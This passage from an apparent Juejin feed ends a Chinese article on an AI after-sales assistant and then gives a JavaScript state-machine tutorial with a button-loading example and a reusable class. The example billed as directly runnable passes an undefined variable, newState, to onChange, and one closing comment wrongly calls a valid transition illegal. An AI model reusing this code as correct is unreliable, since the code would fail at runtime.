loading="lazy"/></td></tr></tbody></table>
<p>Tips：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8d88e9c433343a88c743d20b6406bcb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=q83IXHszRakEovzwpGqyRWbEAAw%3D" alt="" loading="lazy"/></p>
<ol start="6">
<li><strong>对话缓存</strong>：支持多轮对话，记忆上下文，体验更连贯</li>
</ol>
<p>为实现多轮对话支持，系统通过缓存记录当前会话的关键信息（如售后单ID），使得用户在后续提问中无需重复输入，提升交互连贯性。</p>













<table><thead><tr><th>配置</th><th>应用</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56a622ba9d6e47968ddf3f9ad1c17571~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=6Sdb1IyxxPg3eRMBMrZRcq%2Ba624%3D" alt="" loading="lazy"/> <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d02c552c749e4f6f934c2f0326344afe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=8EtmWpoAF7iqZ%2FMD8A%2BxTDjV5%2BI%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/679911d580e94d7eaf2c45bceb9df559~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=OPtu9FmlYF99vkBiu1adqLUChqA%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<h2 data-id="heading-10">五、已实现场景演示</h2>
<h3 data-id="heading-11">📌 场景一：售后单实时状态查询</h3>
<p>用户输入售后单号，系统自动拉取最新状态、处理人、时间节点，并给出业务解释。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21c47990bdee4520a312712f642848bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=TtOlx%2B8XbT6rNdZOIwISPTygAqI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">📌 场景二：基于单号的业务逻辑追问</h3>
<p>例如：“为什么这个售后单不能走极速退？”系统结合单号数据与业务规则，给出明确原因。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffdebdcd576c434daa66cfdeca800bcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=yaT0DBHhTln3AbPc80W5PI8C2O0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">📌 场景三：数据构造指导</h3>
<p>针对测试场景，推荐数据构造方案，并附带示例链接与参数建议。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fbc567114ed4cb59313a59740b576b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=JDh%2FfBM7tHh43c9xYYpWkNlq0gI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">📌 场景四：无单号纯逻辑答疑</h3>
<p>即使没有单号，也能回答诸如“什么情况下会触发质检？”等通用规则问题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45c028a890e3435585e115be0a257e0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=Px%2FnkYyUJd7BQbZ%2Fb49SGjmJ7zk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">六、效果已现，优化持续</h2>
<p>目前，智能助手已初步覆盖售后核心问答场景，响应速度提升至秒级，人力释放显著。接下来，我们将：</p>
<ol>
<li>持续扩充知识库，覆盖更多业务分支</li>
<li>优化问题分类准确率，支持更细粒度问答</li>
<li>增强多轮对话能力，处理复杂问题链</li>
<li>探索与业务系统深度集成，推动流程自动化</li>
</ol>
<hr/>
<p>AI不是替代人力，而是<strong>增强人效、沉淀知识、标准化服务</strong>。售后智能助手正是这一理念的落地实践——让业务支持更智能，让团队协作更轻松。</p>
<p>未来，我们将继续探索AI在业务场景中的深度融合，让每一个流程节点都拥有“智慧支持”。<strong>智能售后，应答而来。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[简单记录下 状态机]]></title>    <link>https://juejin.cn/post/7603160727718051891</link>    <guid>https://juejin.cn/post/7603160727718051891</guid>    <pubDate>2026-02-05T09:53:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727718051891" data-draft-id="7603160727717920819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="简单记录下 状态机"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T09:53:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ccnocare"/> <meta itemprop="url" content="https://juejin.cn/user/1704658072243594"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            简单记录下 状态机
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1704658072243594/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ccnocare
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:53:16.000Z" title="Thu Feb 05 2026 09:53:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>以下是<strong>简单的状态机设计模式</strong>和简单示例，核心是先理解状态机的核心思想，再通过极简示例掌握用法，最后扩展到通用设计模式。</p>
<h3 data-id="heading-0">一、先搞懂：状态机的核心思想（人话版）</h3>
<p>状态机本质是「<strong>把复杂的状态切换规则写死，让程序只能按规则走</strong>」，就像：</p>
<ul>
<li>玩游戏时，角色「站立」只能切「行走/跳跃」，不能直接切「死亡」；</li>
<li>点外卖时，「待付款」只能切「付款中/取消」，不能直接切「已收货」。
核心三要素（记住这3个，状态机就懂了）：</li>
</ul>
<ol>
<li><strong>状态（State）</strong>：
程序当前的“身份”（比如：空闲、加载中、成功、失败）；</li>
<li><strong>事件（Event）</strong>：触发状态变化的“动作”（比如：点击“加载”、请求成功、请求失败）；</li>
<li><strong>规则（Transition）</strong>：“什么状态下触发什么事件，能切到什么新状态”（比如：空闲→点击加载→加载中）。</li>
</ol>
<hr/>
<h3 data-id="heading-1">二、前端状态机的通用设计模式（极简版）</h3>
<p>不用依赖任何库，纯原生JS就能实现，核心结构就4部分：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 状态机设计模式模板（通用） </span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">StateMachine</span> = { 
    <span class="hljs-comment">// 1. 初始状态 </span>
    <span class="hljs-attr">currentState</span>: <span class="hljs-string">"初始状态"</span>, 
    <span class="hljs-comment">// 2. 状态切换规则：{ 当前状态: { 事件: 目标状态 } } </span>
    <span class="hljs-attr">rules</span>: {}, 
    <span class="hljs-comment">// 3. 触发状态切换的核心方法</span>
    <span class="hljs-title function_">trigger</span>(<span class="hljs-params">event, payload</span>) { 
        <span class="hljs-comment">// 第一步：查规则，判断当前状态能不能触发这个事件 </span>
        <span class="hljs-keyword">const</span> nextState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>]?.[event]; 
        <span class="hljs-keyword">if</span> (!nextState) { 
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`❌ <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentState}</span>状态下不能触发<span class="hljs-subst">${event}</span>事件`</span>); 
            <span class="hljs-keyword">return</span>; 
        } 
        <span class="hljs-comment">// 第二步：记录旧状态，切换到新状态 </span>
        <span class="hljs-keyword">const</span> oldState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = nextState; 
        <span class="hljs-comment">// 第三步：执行状态切换后的逻辑（比如更新UI、调接口） </span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onChange</span>(nextState, oldState, payload); 
    }, 
    <span class="hljs-comment">// 4. 状态变更后的回调（自定义业务逻辑） </span>
    <span class="hljs-title function_">onChange</span>(<span class="hljs-params">newState, oldState, payload</span>) { 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`✅ 状态变更：<span class="hljs-subst">${oldState}</span> → <span class="hljs-subst">${newState}</span>`</span>, payload); 
    }, 
};

</code></pre>
<hr/>
<h3 data-id="heading-2">三、最简单示例：</h3>
<p>按钮点击的加载状态机 用「按钮点击请求数据」这个前端最常见的场景，实现状态机，一看就懂：</p>
<h4 data-id="heading-3">需求</h4>
<p>按钮有4个状态：</p>
<ul>
<li>初始：<code>idle</code>（空闲，可点击）；</li>
<li>点击后：<code>loading</code>（加载中，禁用按钮）；</li>
<li>请求成功：<code>success</code>（显示成功，3秒后重置为空闲）；</li>
<li>请求失败：<code>error</code>（显示失败，可重新点击）。</li>
</ul>
<h4 data-id="heading-4">完整代码（可直接复制运行）</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> 
    <span class="hljs-comment">&lt;!-- UI：一个按钮 + 状态提示 --&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"btn"</span>&gt;</span>点击加载数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"status"</span>&gt;</span>当前状态：空闲<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> 
        <span class="hljs-comment">// 1. 初始化状态机 </span>
        <span class="hljs-keyword">const</span> loadDataFSM = { 
            <span class="hljs-comment">// 初始状态：空闲 </span>
            <span class="hljs-attr">currentState</span>: <span class="hljs-string">"idle"</span>, 
            <span class="hljs-comment">// 2. 定义状态切换规则（核心！） </span>
            <span class="hljs-attr">rules</span>: { <span class="hljs-attr">idle</span>: { <span class="hljs-attr">click</span>: <span class="hljs-string">"loading"</span> },
            <span class="hljs-comment">// 空闲→点击→加载中 </span>
            <span class="hljs-attr">loading</span>: { <span class="hljs-attr">success</span>: <span class="hljs-string">"success"</span>, <span class="hljs-attr">fail</span>: <span class="hljs-string">"error"</span> }, 
            <span class="hljs-comment">// 加载中→成功/失败 </span>
            <span class="hljs-attr">success</span>: { <span class="hljs-attr">reset</span>: <span class="hljs-string">"idle"</span> }, 
            <span class="hljs-comment">// 成功→重置→空闲 </span>
            <span class="hljs-attr">error</span>: { <span class="hljs-attr">retry</span>: <span class="hljs-string">"loading"</span> } 
            <span class="hljs-comment">// 失败→重试→加载中 </span>
        }, 
        <span class="hljs-comment">// 3. 触发状态切换的方法 </span>
        <span class="hljs-title function_">trigger</span>(<span class="hljs-params">event, payload</span>) { 
            <span class="hljs-keyword">const</span> nextState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>]?.[event]; 
            <span class="hljs-keyword">if</span> (!nextState) { 
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">`当前<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentState}</span>状态，不能<span class="hljs-subst">${event}</span>！`</span>); 
                <span class="hljs-keyword">return</span>; 
            } 
            <span class="hljs-keyword">const</span> oldState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>; 
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = nextState; 
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onChange</span>(newState, oldState, payload); 
        }, 
        <span class="hljs-comment">// 4. 状态变更后更新UI（业务逻辑） </span>
        <span class="hljs-title function_">onChange</span>(<span class="hljs-params">newState, oldState, payload</span>) { 
            <span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"btn"</span>);
            <span class="hljs-keyword">const</span> status = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"status"</span>); 
            <span class="hljs-comment">// 根据新状态更新UI </span>
            <span class="hljs-keyword">switch</span> (newState) { 
                <span class="hljs-keyword">case</span> <span class="hljs-string">"loading"</span>: 
                    btn.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>; 
                    btn.<span class="hljs-property">innerText</span> = <span class="hljs-string">"加载中..."</span>; 
                    status.<span class="hljs-property">innerText</span> = <span class="hljs-string">"当前状态：加载中"</span>; 
                    <span class="hljs-comment">// 模拟异步请求 </span>
                    <span class="hljs-title function_">mockRequest</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> { 
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"success"</span>);  <span class="hljs-comment">// 请求成功→切换到success </span>
                    }).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> { 
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"fail"</span>); <span class="hljs-comment">// 请求失败→切换到error </span>
                    }); 
                    <span class="hljs-keyword">break</span>; 
                <span class="hljs-keyword">case</span> <span class="hljs-string">"success"</span>: 
                    btn.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>; 
                    btn.<span class="hljs-property">innerText</span> = <span class="hljs-string">"点击加载数据"</span>; 
                    status.<span class="hljs-property">innerText</span> = <span class="hljs-string">"当前状态：成功（3秒后重置）"</span>; <span class="hljs-comment">// 3秒后重置为空闲</span>
                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"reset"</span>), <span class="hljs-number">3000</span>); 
                    <span class="hljs-keyword">break</span>; 
                <span class="hljs-keyword">case</span> <span class="hljs-string">"error"</span>: 
                    btn.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>; 
                    btn.<span class="hljs-property">innerText</span> = <span class="hljs-string">"重新加载"</span>; 
                    status.<span class="hljs-property">innerText</span> = <span class="hljs-string">"当前状态：失败，可重试"</span>; 
                    <span class="hljs-keyword">break</span>; 
                <span class="hljs-keyword">case</span> <span class="hljs-string">"idle"</span>: 
                    btn.<span class="hljs-property">innerText</span> = <span class="hljs-string">"点击加载数据"</span>;
                    status.<span class="hljs-property">innerText</span> = <span class="hljs-string">"当前状态：空闲"</span>; 
                    <span class="hljs-keyword">break</span>; 
                } 
            } 
        }; 
        <span class="hljs-comment">// 模拟异步请求（50%成功率） </span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">mockRequest</span>(<span class="hljs-params"/>) { 
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> { 
                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> { 
                    <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span> ? <span class="hljs-title function_">resolve</span>() : <span class="hljs-title function_">reject</span>(); 
                }, <span class="hljs-number">1000</span>); 
        }); 
        } 
        <span class="hljs-comment">// 绑定按钮点击事件 </span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"btn"</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> { 
            <span class="hljs-comment">// 点击按钮：触发对应事件（idle态触发click，error态触发retry） </span>
            <span class="hljs-keyword">const</span> event = loadDataFSM.<span class="hljs-property">currentState</span> === <span class="hljs-string">"idle"</span> ? <span class="hljs-string">"click"</span> : <span class="hljs-string">"retry"</span>;
            loadDataFSM.<span class="hljs-title function_">trigger</span>(event); 
        }); 
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> 
</code></pre>
<h4 data-id="heading-5">运行效果</h4>
<ol>
<li>初始：按钮可点击，显示“点击加载数据”，状态提示“空闲”；</li>
<li>点击按钮：按钮禁用，显示“加载中...”，1秒后随机切换：
<ul>
<li>成功：按钮恢复，显示“点击加载数据”，3秒后重置为初始态；</li>
<li>失败：按钮恢复，显示“重新加载”，点击可重试；</li>
</ul>
</li>
<li>非法操作拦截：比如“加载中”时重复点击按钮，会提示“加载中状态下不能click事件”。</li>
</ol>
<hr/>
<h3 data-id="heading-6">四、核心设计思路拆解（通俗易懂）</h3>
<h4 data-id="heading-7">1. 为什么这么设计？</h4>
<ul>
<li>把「状态规则」和「业务逻辑」分开：规则写在<code>rules</code>里，UI逻辑写在<code>onChange</code>里，不用混在一起；</li>
<li>所有状态切换都走<code>trigger</code>方法，相当于“唯一入口”，避免直接改<code>currentState</code>导致的混乱；</li>
<li>规则是“显性的”，比如看<code>rules</code>就知道：</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">    <span class="hljs-attr">rules</span>: { 
        <span class="hljs-attr">idle</span>: { <span class="hljs-attr">click</span>: <span class="hljs-string">"loading"</span> }, 
        <span class="hljs-attr">loading</span>: { <span class="hljs-attr">success</span>: <span class="hljs-string">"success"</span>, <span class="hljs-attr">fail</span>: <span class="hljs-string">"error"</span> }, 
        <span class="hljs-attr">success</span>: { <span class="hljs-attr">reset</span>: <span class="hljs-string">"idle"</span> }, 
        <span class="hljs-attr">error</span>: { <span class="hljs-attr">retry</span>: <span class="hljs-string">"loading"</span> }
    }
</code></pre>
<p>不用逐行读代码，就能知道“什么状态能做什么事”。</p>
<h4 data-id="heading-8">2. 关键细节（新手必看）</h4>
<ul>
<li><code>trigger</code>方法是“门卫”：先查规则，再切换状态，最后执行逻辑，一步都不能少；</li>
<li><code>onChange</code>方法是“执行者”：只负责状态变更后的业务（比如更UI、调接口），不关心怎么切换的；</li>
<li>永远不要直接改<code>currentState</code>：比如不要写<code>loadDataFSM.currentState = "success"</code>，必须通过<code>trigger</code>触发，否则会绕过规则校验。</li>
</ul>
<hr/>
<h3 data-id="heading-9">五、扩展：更通用的状态机类（可复用）</h3>
<p>如果多个场景要用状态机，可封装成类，复用性更高：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 通用状态机类 </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleFSM</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">initialState, rules, onChange</span>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = initialState; <span class="hljs-comment">// 初始状态 </span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span> = rules; <span class="hljs-comment">// 切换规则 </span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onChange</span> = onChange; <span class="hljs-comment">// 状态变更回调 </span>
    } 
    <span class="hljs-comment">// 触发状态切换 </span>
    <span class="hljs-title function_">trigger</span>(<span class="hljs-params">event, payload</span>) { 
        <span class="hljs-keyword">const</span> nextState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>]?.[event]; 
        <span class="hljs-keyword">if</span> (!nextState) { 
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`❌ 非法操作：<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentState}</span> → <span class="hljs-subst">${event}</span>`</span>); 
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; 
        } 
        <span class="hljs-keyword">const</span> oldState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = nextState; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onChange</span>?.(nextState, oldState, payload); <span class="hljs-comment">// 执行回调 </span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; 
    } 
    <span class="hljs-comment">// 获取当前状态 </span>
    <span class="hljs-title function_">getState</span>(<span class="hljs-params"/>) { 
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>; 
    } 
}
<span class="hljs-comment">// 用法：创建一个弹窗状态机 </span>
<span class="hljs-keyword">const</span> modalFSM = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleFSM</span>( 
   <span class="hljs-string">"closed"</span>, <span class="hljs-comment">// 初始状态：关闭 </span>
   <span class="hljs-comment">// 切换规则 </span>
   { 
       <span class="hljs-attr">closed</span>: { <span class="hljs-attr">open</span>: <span class="hljs-string">"opened"</span> }, 
       <span class="hljs-attr">opened</span>: { <span class="hljs-attr">close</span>: <span class="hljs-string">"closed"</span>, <span class="hljs-attr">confirm</span>: <span class="hljs-string">"closed"</span> } 
   }, 
   <span class="hljs-comment">// 状态变更回调（更新弹窗UI） </span>
   <span class="hljs-function">(<span class="hljs-params">newState</span>) =&gt;</span> { 
       <span class="hljs-keyword">const</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"modal"</span>); 
       modal.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = newState === <span class="hljs-string">"opened"</span> ? <span class="hljs-string">"block"</span> : <span class="hljs-string">"none"</span>; 
   } 
   );
  <span class="hljs-comment">// 调用示例 </span>
  modalFSM.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"open"</span>); <span class="hljs-comment">// 打开弹窗 </span>
  modalFSM.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"confirm"</span>);<span class="hljs-comment">// 确认关闭弹窗 </span>
  modalFSM.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"open"</span>); <span class="hljs-comment">// 非法操作：closed态才能open，opened态不行，会提示</span>
